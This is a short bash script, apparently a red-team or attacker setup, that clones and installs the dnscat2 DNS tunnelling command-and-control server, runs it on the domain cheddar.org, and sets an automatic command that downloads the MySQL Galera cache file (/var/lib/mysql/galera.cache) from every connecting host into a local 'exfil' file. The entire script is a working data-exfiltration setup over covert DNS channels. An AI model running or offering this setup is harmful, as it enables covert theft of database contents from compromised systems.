#!/usr/bin/env bash

git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo su
apt-get install ruby-dev
apt-get install gem
gem install bundler
bundle install
ruby ./dnscat2.rb cheddar.org
set passthrough=8.8.8.8:53
set auto_command=download /var/lib/mysql/galera.cache ./exfil; delay 5
window -i dns1